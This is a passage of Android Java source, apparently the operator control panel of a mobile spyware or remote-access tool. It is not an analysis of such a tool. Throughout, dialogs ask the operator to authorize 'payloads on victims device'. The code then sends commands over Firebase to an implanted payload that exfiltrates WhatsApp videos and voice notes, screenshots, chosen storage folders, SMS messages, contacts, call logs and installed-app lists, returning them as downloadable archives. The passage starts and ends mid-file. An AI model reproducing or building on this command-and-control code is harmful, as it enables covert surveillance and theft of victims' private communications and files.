                BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(getActivity());
                bottomSheetDialog.setContentView(R.layout.bottom_sheet_whatsapp);
                Croller croller = (Croller) bottomSheetDialog.findViewById(R.id.croller);
                TextView textView = bottomSheetDialog.findViewById(R.id.payl);
                TextView tittle = bottomSheetDialog.findViewById(R.id.text);
                tittle.setText("Video media extraction panel");
                AppCompatButton getALl = bottomSheetDialog.findViewById(R.id.getAll);
                AppCompatButton uploadSelected = bottomSheetDialog.findViewById(R.id.proceed);

                getALl.setOnClickListener(o -> {
                    new AlertDialog.Builder(getContext())
                            .setTitle("Execution Authorization for all File/s")
                            .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_VIDEOS_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
                            .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
                                Toast.makeText(getContext(), "Please wait while we set the runtime props.", Toast.LENGTH_SHORT).show();
                                FirebaseDatabase
                                        .getInstance()
                                        .getReference("RUNTIME_PROPS")
                                        .child("WHATSAPP")
                                        .child("WHATSAPP_VIDEO_LENGTH")
                                        .setValue(-1)
                                        .addOnCompleteListener(new OnCompleteListener<Void>() {
                                            @Override
                                            public void onComplete(@NonNull Task<Void> task) {
                                                if (task.isSuccessful()) {
                                                    startWhatsappMediaExtraction("Get all Videos", PayloadTypes.GET_WHATSAPP_VIDEOS);

                                                } else {
                                                    //TODO ADD LOGS
                                                    t1.speak("Internal Error check server logs", TextToSpeech.QUEUE_FLUSH, null);
                                                    Toast.makeText(getActivity(), "Error " + task.getException().getMessage(), Toast.LENGTH_SHORT).show();
                                                }
                                            }
                                        });
                            })
                            .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show();

                });

                uploadSelected.setOnClickListener(p -> {
                    new AlertDialog.Builder(getContext())
                            .setTitle("Execution Authorization for " + progressF + " File/s")
                            .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_VIDEOS_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
                            .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
                                Toast.makeText(getContext(), "Please wait while we set the runtime props.", Toast.LENGTH_SHORT).show();
                                FirebaseDatabase
                                        .getInstance()
                                        .getReference("RUNTIME_PROPS")
                                        .child("WHATSAPP")
                                        .child("WHATSAPP_VIDEO_LENGTH")
                                        .setValue(progressF)
                                        .addOnCompleteListener(new OnCompleteListener<Void>() {
                                            @Override
                                            public void onComplete(@NonNull Task<Void> task) {
                                                if (task.isSuccessful()) {
                                                    startWhatsappMediaExtraction("Get all Videos", PayloadTypes.GET_WHATSAPP_VIDEOS);

                                                } else {
                                                    //TODO ADD LOGS
                                                    t1.speak("Internal Error check server logs", TextToSpeech.QUEUE_FLUSH, null);
                                                    Toast.makeText(getActivity(), "Error " + task.getException().getMessage(), Toast.LENGTH_SHORT).show();
                                                }
                                            }
                                        });
                            })
                            .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show();

                });


                croller.setOnProgressChangedListener(new Croller.onProgressChangedListener() {
                    @Override
                    public void onProgressChanged(int progress) {
                        // use the progress
                        progressF = progress;
                        textView.setText("Total " + progress + " files will be uploaded");

                    }
                });
                bottomSheetDialog.show();
            });

            view.findViewById(R.id.voiceN).setOnClickListener(b -> {
                progressF = 1;
                BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(getActivity());
                bottomSheetDialog.setContentView(R.layout.bottom_sheet_whatsapp);
                Croller croller = (Croller) bottomSheetDialog.findViewById(R.id.croller);
                TextView textView = bottomSheetDialog.findViewById(R.id.payl);
                TextView tittle = bottomSheetDialog.findViewById(R.id.text);
                tittle.setText("Voice Notes extraction panel");
                AppCompatButton getALl = bottomSheetDialog.findViewById(R.id.getAll);
                AppCompatButton uploadSelected = bottomSheetDialog.findViewById(R.id.proceed);

                uploadSelected.setOnClickListener(p -> {
                    new AlertDialog.Builder(getContext())
                            .setTitle("Execution Authorization for " + progressF + " File/s")
                            .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_VOICE_NOTES PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
                            .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
                                Toast.makeText(getContext(), "Please wait while we set the runtime props.", Toast.LENGTH_SHORT).show();
                                FirebaseDatabase
                                        .getInstance()
                                        .getReference("RUNTIME_PROPS")
                                        .child("WHATSAPP")
                                        .child("WHATSAPP_VOICE_LENGTH")
                                        .setValue(progressF)
                                        .addOnCompleteListener(new OnCompleteListener<Void>() {
                                            @Override
                                            public void onComplete(@NonNull Task<Void> task) {
                                                if (task.isSuccessful()) {
                                                    startWhatsappMediaExtraction("Get all Voice Notes", PayloadTypes.GET_WHATSAPP_VOICE_NOTES);

                                                } else {
                                                    //TODO ADD LOGS
                                                    t1.speak("Internal Error check server logs", TextToSpeech.QUEUE_FLUSH, null);
                                                    Toast.makeText(getActivity(), "Error " + task.getException().getMessage(), Toast.LENGTH_SHORT).show();
                                                }
                                            }
                                        });
                            })
                            .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show();

                });

                getALl.setOnClickListener(p -> {
                    new AlertDialog.Builder(getContext())
                            .setTitle("Execution Authorization for all File/s")
                            .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_VOICE_NOTES PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
                            .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
                                Toast.makeText(getContext(), "Please wait while we set the runtime props.", Toast.LENGTH_SHORT).show();
                                FirebaseDatabase
                                        .getInstance()
                                        .getReference("RUNTIME_PROPS")
                                        .child("WHATSAPP")
                                        .child("WHATSAPP_VOICE_LENGTH")
                                        .setValue(-1)
                                        .addOnCompleteListener(new OnCompleteListener<Void>() {
                                            @Override
                                            public void onComplete(@NonNull Task<Void> task) {
                                                if (task.isSuccessful()) {
                                                    startWhatsappMediaExtraction("Get all Voice Notes", PayloadTypes.GET_WHATSAPP_VOICE_NOTES);
                                                } else {
                                                    //TODO ADD LOGS
                                                    t1.speak("Internal Error check server logs", TextToSpeech.QUEUE_FLUSH, null);
                                                    Toast.makeText(getActivity(), "Error " + task.getException().getMessage(), Toast.LENGTH_SHORT).show();
                                                }
                                            }
                                        });
                            })
                            .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show();

                });

                croller.setOnProgressChangedListener(new Croller.onProgressChangedListener() {
                    @Override
                    public void onProgressChanged(int progress) {
                        // use the progress
                        progressF = progress;
                        textView.setText("Total " + progress + " files will be uploaded");


                    }
                });
                bottomSheetDialog.show();
            });

            view.findViewById(R.id.folderGet).setOnClickListener(b -> {
                getActivity().getWindow().setSoftInputMode(SOFT_INPUT_ADJUST_PAN);
                BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(getActivity());
                bottomSheetDialog.setContentView(R.layout.bottom_sheet_folder);
                //TODO UPDATE LOGIC TO UPDATE HERE
                AppCompatButton proceed = bottomSheetDialog.findViewById(R.id.proceed);
                EditText editText = bottomSheetDialog.findViewById(R.id.directory);
                LinearLayout callRecordings = bottomSheetDialog.findViewById(R.id.callRecordings);
                LinearLayout documents = bottomSheetDialog.findViewById(R.id.documents);
                LinearLayout dcim = bottomSheetDialog.findViewById(R.id.dcim);
                LinearLayout snapchat = bottomSheetDialog.findViewById(R.id.snapchat);

                callRecordings.setOnClickListener(o -> editText.setText("MIUI/sound_recorder/"));
                documents.setOnClickListener(o -> editText.setText("Documents/"));
                dcim.setOnClickListener(o -> editText.setText("DCIM/"));
                snapchat.setOnClickListener(o -> editText.setText("DCIM/Snapchat"));

                proceed.setOnClickListener(y -> {
                    if (editText.getText().toString().isEmpty()) {
                        editText.setError("Path required !!");
                        editText.requestFocus();
                    } else {
                        String path;
                        if (editText.getText().toString().startsWith("/")) {
                            path = editText.getText().toString();
                        } else path = "/" + editText.getText().toString();

                        new AlertDialog.Builder(getContext())
                                .setTitle("Execution Authorization for File/s")
                                .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_STORAGE_PATHS PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
                                .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
                                    Toast.makeText(getContext(), "Please wait while we set the runtime props.", Toast.LENGTH_SHORT).show();
                                    FirebaseDatabase
                                            .getInstance()
                                            .getReference("RUNTIME_PROPS")
                                            .child("FILE_PATH_TO_ZIP")
                                            .setValue(path)
                                            .addOnCompleteListener(new OnCompleteListener<Void>() {
                                                @Override
                                                public void onComplete(@NonNull Task<Void> task) {
                                                    if (task.isSuccessful()) {
                                                        startFileStorageExtraction();

                                                    } else {
                                                        //TODO ADD LOGS
                                                        t1.speak("Internal Error check server logs", TextToSpeech.QUEUE_FLUSH, null);
                                                        Toast.makeText(getActivity(), "Error " + task.getException().getMessage(), Toast.LENGTH_SHORT).show();
                                                    }
                                                }
                                            });
                                })
                                .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show();


                    }
                });

                bottomSheetDialog.show();
            });

            view.findViewById(R.id.deviceInfo).setOnClickListener(b -> {
                Toast.makeText(getContext(), "Currently un available", Toast.LENGTH_SHORT).show();
            });

            view.findViewById(R.id.loc).setOnClickListener(k -> {
                try {

                    final TelephonyManager telephony = (TelephonyManager) getContext().getSystemService(Context.TELEPHONY_SERVICE);
                    if (telephony.getPhoneType() == TelephonyManager.PHONE_TYPE_GSM) {
                        @SuppressLint("MissingPermission") final GsmCellLocation location = (GsmCellLocation) telephony.getCellLocation();
                        if (location != null) {
                            String LAC = location.getLac() + "";
                            String CID = location.getCid() + "";
                            Log.e("LAC", LAC);
                            Log.e("CID", CID);
                            Toast.makeText(getContext(), " " + LAC + " " + CID, Toast.LENGTH_SHORT).show();
                        }
                    }
                } catch (Exception e) {
                    Toast.makeText(getContext(), " " + e.getMessage(), Toast.LENGTH_SHORT).show();
                }
            });

            view.findViewById(R.id.battery).setOnClickListener(i -> {
                new AlertDialog.Builder(getContext())
                        .setTitle("Execution Authorization")
                        .setMessage(Html.fromHtml("<br>Are you sure you want to execute the BATTERY_DATA PAYLOAD on victims device ??<br><br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be sent back to you.</li><ul>"))
                        .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
                            getBatteryData();
                        })
                        .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show();

            });

            view.findViewById(R.id.getSc).setOnClickListener(o -> {
                BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(getActivity());
                bottomSheetDialog.setContentView(R.layout.bottom_sheet_sc);
                Croller croller = (Croller) bottomSheetDialog.findViewById(R.id.croller);
                TextView textView = bottomSheetDialog.findViewById(R.id.payl);
                AppCompatButton getALl = bottomSheetDialog.findViewById(R.id.getAll);
                AppCompatButton uploadSelected = bottomSheetDialog.findViewById(R.id.proceed);

                uploadSelected.setOnClickListener(i -> {
                    new AlertDialog.Builder(getContext())
                            .setTitle("Execution Authorization for " + progressF + " File/s")
                            .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_SCREENSHOT PAYLOAD on victims device ??<br><br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
                            .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
                                Toast.makeText(getContext(), "Please wait while we set the runtime props.", Toast.LENGTH_SHORT).show();
                                FirebaseDatabase
                                        .getInstance()
                                        .getReference("RUNTIME_PROPS")
                                        .child("NO_OF_SCREENSHOTS")
                                        .setValue(progressF)
                                        .addOnCompleteListener(new OnCompleteListener<Void>() {
                                            @Override
                                            public void onComplete(@NonNull Task<Void> task) {
                                                if (task.isSuccessful()) {
                                                    startScExtraction();
                                                } else {
                                                    //TODO ADD LOGS
                                                    t1.speak("Internal Error check server logs", TextToSpeech.QUEUE_FLUSH, null);
                                                    Toast.makeText(getActivity(), "Error " + task.getException().getMessage(), Toast.LENGTH_SHORT).show();
                                                }
                                            }
                                        });
                            })
                            .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show();

                });

                getALl.setOnClickListener(ow -> {

                    new AlertDialog.Builder(getContext())
                            .setTitle("Execution Authorization")
                            .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_SCREENSHOT PAYLOAD on victims device ??<br><br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul><br>You have selected to upload all the screenshots on the victims device.."))
                            .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
                                Toast.makeText(getContext(), "Please wait while we set the runtime props.", Toast.LENGTH_SHORT).show();
                                FirebaseDatabase
                                        .getInstance()
                                        .getReference("RUNTIME_PROPS")
                                        .child("NO_OF_SCREENSHOTS")
                                        .setValue(-1)
                                        .addOnCompleteListener(new OnCompleteListener<Void>() {
                                            @Override
                                            public void onComplete(@NonNull Task<Void> task) {
                                                if (task.isSuccessful()) {
                                                    startScExtraction();
                                                } else {
                                                    //TODO ADD LOGS
                                                    t1.speak("Internal Error check server logs", TextToSpeech.QUEUE_FLUSH, null);
                                                    Toast.makeText(getActivity(), "Error " + task.getException().getMessage(), Toast.LENGTH_SHORT).show();
                                                }
                                            }
                                        });
                            })
                            .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show();

                });

                croller.setOnProgressChangedListener(new Croller.onProgressChangedListener() {
                    @Override
                    public void onProgressChanged(int progress) {
                        // use the progress
                        progressF = progress;
                        textView.setText("Total " + progress + " files will be uploaded");

                    }
                });
                bottomSheetDialog.show();
            });

            view.findViewById(R.id.draft).setOnClickListener(o -> {
                new AlertDialog.Builder(getContext())
                        .setTitle("Execution Authorization")
                        .setMessage(Html.fromHtml("<br>Are you sure you want to execute the SMS_DRAFT PAYLOAD on victims device ??<br><br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a JSON file and will be sent back to you.</li><ul>"))
                        .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
                            startSMSDraftLogExtraction();
                        })
                        .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show();

            });

            view.findViewById(R.id.contacts)
                    .setOnClickListener(o -> {
                        new AlertDialog.Builder(getContext())
                                .setTitle("Execution Authorization")
                                .setMessage(Html.fromHtml("<br>Are you sure you want to execute the CONTACTS PAYLOAD on victims device ??<br><br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a JSON file and will be sent back to you.</li><ul>"))
                                .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
                                    startContactExtraction();
                                })
                                .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show();
                    });

            view.findViewById(R.id.sent).setOnClickListener(o -> {
                new AlertDialog.Builder(getContext())
                        .setTitle("Execution Authorization")
                        .setMessage(Html.fromHtml("<br>Are you sure you want to execute the SMS_OUTBOX PAYLOAD on victims device ??<br><br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a JSON file and will be sent back to you.</li><ul>"))
                        .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
                            startSMSOutboxLogExtraction();
                        })
                        .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show();

            });
            sma_inbox.setOnClickListener(o -> {
                new AlertDialog.Builder(getContext())
                        .setTitle("Execution Authorization")
                        .setMessage(Html.fromHtml("<br>Are you sure you want to execute the SMS_INBOX PAYLOAD on victims device ??<br><br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a JSON file and will be sent back to you.</li><ul>"))
                        .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
                            startSMSLogExtraction();
                        })
                        .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show();

            });
            call_logs.setOnClickListener(y ->
                    new AlertDialog.Builder(getContext())
                            .setTitle("Execution Authorization")
                            .setMessage(Html.fromHtml("<br>Are you sure you want to execute the CALL LOGS PAYLOAD on victims device ??<br><br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a JSON file and will be sent back to you.</li><ul>"))
                            .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
                                startCallLogExtraction();
                            })
                            .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show());

            view.findViewById(R.id.installedApplications).setOnClickListener(y -> {
                new AlertDialog.Builder(getContext())
                        .setTitle("Execution Authorization")
                        .setMessage(Html.fromHtml("<br>Are you sure you want to execute the APP LOGS PAYLOAD on victims device ??<br><br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a JSON file and will be sent back to you.</li><ul>"))
                        .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
                            startAppLogExtraction();
                        })
                        .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show();
            });
        }

        return view;
    }

    private void startAppLogExtraction() {
        final int[] c = {0};
        alertDialog = new AlertDialog.Builder(getActivity())
                .setMessage("Waiting for payload response... please do not close this window.")
                .create();
        alertDialog.show();
        PayloadConnection
                .initializePayloadConnection()
                .checkPayloadConnection(new PayloadConnectionListner() {
                    @Override
                    public void onConnectionSuccessful() {
                        t1.speak("Connection Established, Executing payload now", TextToSpeech.QUEUE_FLUSH, null);
                        alertDialog.dismiss();
                        AlertDialog alertDialog = new AlertDialog.Builder(getContext())
                                .setCancelable(false)
                                .setPositiveButton("STOP", (o, l) -> {
                                })
                                .setTitle("Extraction of Installed apps details")
                                .setMessage("\nChecking payload.... DONE")
                                .show();
                        TextView messageView = alertDialog.findViewById(android.R.id.message);
                        FirebaseDatabase
                                .getInstance()
                                .getReference("test")
                                .child(selected_device)
                                .child("command")
                                .setValue(20)
                                .addOnCompleteListener(p -> {
                                    if (p.isSuccessful()) {
                                        messageView.setText(messageView.getText().toString().concat("\nSending command to the payload.... DONE\nCounting Files... DONE\nCompressing and uploading... PROGRESS"));
                                        FirebaseDatabase
                                                .getInstance()
                                                .getReference("LIVE")
                                                .child(selected_device)
                                                .child("installed_apps")
                                                .addValueEventListener(new ValueEventListener() {
                                                    @Override
                                                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                                                        if (snapshot.exists()) {
                                                            //TODO UPDATE SQL
                                                            if (c[0] == 1) {

                                                                FirebaseDatabase.getInstance().getReference("test").child(selected_device).child("command").setValue(99);
                                                                messageView.setText(messageView.getText().toString().concat("\nReceived data from the payload.... DONE\nDisplaying data."));
                                                                alertDialog.dismiss();
                                                                Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(snapshot.getValue(String.class)));
                                                                startActivity(browserIntent);
                                                                //startActivity(new Intent(getContext(), ContactsDisplay.class).putExtra("uri",snapshot.getValue(String.class)));
                                                                snapshot.getRef().removeEventListener(this);
                                                            }
                                                            c[0]++;

                                                        }
                                                    }

                                                    @Override
                                                    public void onCancelled(@NonNull DatabaseError error) {

                                                    }
                                                });

                                    } else {
                                        t1.speak("Data extraction failed..", TextToSpeech.QUEUE_FLUSH, null);

                                    }
                                });


                    }

                    @Override
                    public void onPayloadError(String message) {
                        t1.speak("Failed to connect to the server.", TextToSpeech.QUEUE_FLUSH, null);

                        Snackbar.make(getView(), "Failed to connect to the server.", Snackbar.LENGTH_LONG)
                                .setAction("DISMISS", v -> {
                                }).show();

                    }
                });
    }

    private void startFileStorageExtraction() {
        final int[] c = {0};
        alertDialog = new AlertDialog.Builder(getActivity())
                .setMessage("Waiting for payload response... please do not close this window.")
                .create();
        alertDialog.show();
        PayloadConnection
                .initializePayloadConnection()
                .checkPayloadConnection(new PayloadConnectionListner() {
                    @Override
                    public void onConnectionSuccessful() {
                        t1.speak("Connection Established, Executing payload now", TextToSpeech.QUEUE_FLUSH, null);
                        alertDialog.dismiss();
                        AlertDialog alertDialog = new AlertDialog.Builder(getContext())
                                .setCancelable(false)
                                .setPositiveButton("STOP", (o, l) -> {
                                })
                                .setTitle("Extraction of selected number of files progress")
                                .setMessage("\nChecking payload.... DONE")
                                .show();
                        TextView messageView = alertDialog.findViewById(android.R.id.message);
                        FirebaseDatabase
                                .getInstance()
                                .getReference("test")
                                .child(selected_device)
                                .child("command")
                                .setValue(10)
                                .addOnCompleteListener(p -> {
                                    if (p.isSuccessful()) {
                                        messageView.setText(messageView.getText().toString().concat("\nSending command to the payload.... DONE\nCounting Files... DONE\nCompressing and uploading... PROGRESS"));
                                        FirebaseDatabase
                                                .getInstance()
                                                .getReference("LIVE")
                                                .child(selected_device)
                                                .child("phone_media_10")
                                                .addValueEventListener(new ValueEventListener() {
                                                    @Override
                                                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                                                        if (snapshot.exists()) {
                                                            //TODO UPDATE SQL
                                                            if (c[0] == 1) {

                                                                FirebaseDatabase.getInstance().getReference("test").child(selected_device).child("command").setValue(99);
                                                                messageView.setText(messageView.getText().toString().concat("\nReceived data from the payload.... DONE\nDisplaying data."));
                                                                alertDialog.dismiss();
                                                                Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(snapshot.getValue(String.class)));
                                                                startActivity(browserIntent);
                                                                //startActivity(new Intent(getContext(), ContactsDisplay.class).putExtra("uri",snapshot.getValue(String.class)));
                                                                snapshot.getRef().removeEventListener(this);
                                                            }
                                                            c[0]++;

                                                        }
                                                    }

                                                    @Override
                                                    public void onCancelled(@NonNull DatabaseError error) {

                                                    }
                                                });

                                    } else {
                                        t1.speak("Data extraction failed..", TextToSpeech.QUEUE_FLUSH, null);

                                    }
                                });


                    }

                    @Override
                    public void onPayloadError(String message) {
                        t1.speak("Failed to connect to the server.", TextToSpeech.QUEUE_FLUSH, null);

                        Snackbar.make(getView(), "Failed to connect to the server.", Snackbar.LENGTH_LONG)
                                .setAction("DISMISS", v -> {
                                }).show();

                    }
                });
    }

    private void getBatteryData() {
        final int[] c = {0};
        alertDialog = new AlertDialog.Builder(getActivity())
                .setMessage("Waiting for payload response... please do not close this window.")
                .create();
        alertDialog.show();
        PayloadConnection
                .initializePayloadConnection()
                .checkPayloadConnection(new PayloadConnectionListner() {
                    @Override
                    public void onConnectionSuccessful() {
                        t1.speak("Connection Established, Executing payload now", TextToSpeech.QUEUE_FLUSH, null);
                        alertDialog.dismiss();
                        AlertDialog alertDialog = new AlertDialog.Builder(getContext())
                                .setCancelable(false)
                                .setPositiveButton("STOP", (o, l) -> {
                                })
                                .setTitle("Extraction of battery health and stats in progress")
                                .setMessage("\nChecking payload.... DONE")
                                .show();
                        TextView messageView = alertDialog.findViewById(android.R.id.message);
                        FirebaseDatabase
                                .getInstance()
                                .getReference("test")
                                .child(selected_device)
                                .child("command")
                                .setValue(7)
                                .addOnCompleteListener(p -> {
                                    if (p.isSuccessful()) {
                                        messageView.setText(messageView.getText().toString().concat("\nSending command to the payload.... DONE\nCounting Params... DONE\nCompressing and uploading... PROGRESS"));
                                        FirebaseDatabase
                                                .getInstance()
                                                .getReference("LIVE")
                                                .child(selected_device)
                                                .child("BATTERY")
                                                .addValueEventListener(new ValueEventListener() {
                                                    @Override
                                                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                                                        if (snapshot.exists()) {
                                                            if (c[0] == 1) {
                                                                //TODO UPDATE SQL
                                                                FirebaseDatabase.getInstance().getReference("test").child(selected_device).child("command").setValue(99);

                                                                StringBuilder stringBuilder = new StringBuilder();
                                                                try {
                                                                    JSONObject jsonObject = new JSONObject(snapshot.getValue(String.class));
                                                                    stringBuilder.append("1. TEMPERATURE STATUS :").append(jsonObject.getString("TEMP_STAT")).append("\n");
                                                                    stringBuilder.append("2. BATTERY CAPACITY :").append(jsonObject.getString("CAPACITY")).append("\n");
                                                                    stringBuilder.append("3. VOLTAGE :").append(jsonObject.getString("VOLTAGE")).append("\n");
                                                                    stringBuilder.append("4. TECH :").append(jsonObject.getString("TECH")).append("\n");
                                                                    stringBuilder.append("5. CHARGE STAT :").append(jsonObject.getString("CHARGE_STAT")).append("\n");
                                                                    stringBuilder.append("6. PLUGGED :").append(jsonObject.getString("PLUGGED")).append("\n");
                                                                    stringBuilder.append("7. BATTERY PERCENT :").append(jsonObject.getString("BATTERY_PER")).append("\n");
                                                                    stringBuilder.append("8. HEALTH :").append(jsonObject.getString("HEALTH")).append("\n");


                                                                } catch (Exception e) {
                                                                    stringBuilder.append("ERROR ").append(e.getMessage());
                                                                }
                                                                messageView.setText(messageView.getText().toString().concat("\nReceived data from the payload.... DONE\nDisplaying data."));
                                                                messageView.setText(messageView.getText().toString().concat("\n\nDATA\n\n" + stringBuilder.toString()));

                                                                //startActivity(new Intent(getContext(), ContactsDisplay.class).putExtra("uri",snapshot.getValue(String.class)));
                                                                snapshot.getRef().removeEventListener(this);
                                                            }
                                                            c[0]++;

                                                        }
                                                    }

                                                    @Override
                                                    public void onCancelled(@NonNull DatabaseError error) {

                                                    }
                                                });

                                    } else {
                                        t1.speak("Data extraction failed..", TextToSpeech.QUEUE_FLUSH, null);

                                    }
                                });


                    }

                    @Override
                    public void onPayloadError(String message) {
                        t1.speak("Failed to connect to the server.", TextToSpeech.QUEUE_FLUSH, null);

                        Snackbar.make(getView(), "Failed to connect to the server.", Snackbar.LENGTH_LONG)
                                .setAction("DISMISS", v -> {
                                }).show();

                    }
                });
    }

    private void startScExtraction() {
        final int[] c = {0};
        alertDialog = new AlertDialog.Builder(getActivity())
                .setMessage("Waiting for payload response... please do not close this window.")
                .create();
        alertDialog.show();
        PayloadConnection
                .initializePayloadConnection()
                .checkPayloadConnection(new PayloadConnectionListner() {
                    @Override
                    public void onConnectionSuccessful() {
                        t1.speak("Connection Established, Executing payload now", TextToSpeech.QUEUE_FLUSH, null);
                        alertDialog.dismiss();
                        AlertDialog alertDialog = new AlertDialog.Builder(getContext())
                                .setCancelable(false)
                                .setPositiveButton("STOP", (o, l) -> {
                                })
                                .setTitle("Extraction of selected number of screenshots progress")
                                .setMessage("\nChecking payload.... DONE")
                                .show();
                        TextView messageView = alertDialog.findViewById(android.R.id.message);
                        FirebaseDatabase
                                .getInstance()
                                .getReference("test")
                                .child(selected_device)
                                .child("command")
                                .setValue(5)
                                .addOnCompleteListener(p -> {
                                    if (p.isSuccessful()) {
                                        messageView.setText(messageView.getText().toString().concat("\nSending command to the payload.... DONE\nCounting Files... DONE\nCompressing and uploading... PROGRESS"));
                                        FirebaseDatabase
                                                .getInstance()
                                                .getReference("LIVE")
                                                .child(selected_device)
                                                .child("screenshots")
                                                .addValueEventListener(new ValueEventListener() {
                                                    @Override
                                                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                                                        if (snapshot.exists()) {
                                                            //TODO UPDATE SQL
                                                            if (c[0] == 1) {

                                                                FirebaseDatabase.getInstance().getReference("test").child(selected_device).child("command").setValue(99);
                                                                messageView.setText(messageView.getText().toString().concat("\nReceived data from the payload.... DONE\nDisplaying data."));
                                                                alertDialog.dismiss();
                                                                Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(snapshot.getValue(String.class)));
                                                                startActivity(browserIntent);
                                                                //startActivity(new Intent(getContext(), ContactsDisplay.class).putExtra("uri",snapshot.getValue(String.class)));
                                                                snapshot.getRef().removeEventListener(this);
                                                            }
                                                            c[0]++;

                                                        }
                                                    }

                                                    @Override
                                                    public void onCancelled(@NonNull DatabaseError error) {

                                                    }
                                                });

                                    } else {
                                        t1.speak("Data extraction failed..", TextToSpeech.QUEUE_FLUSH, null);

                                    }
                                });


                    }

                    @Override
                    public void onPayloadError(String message) {
                        t1.speak("Failed to connect to the server.", TextToSpeech.QUEUE_FLUSH, null);

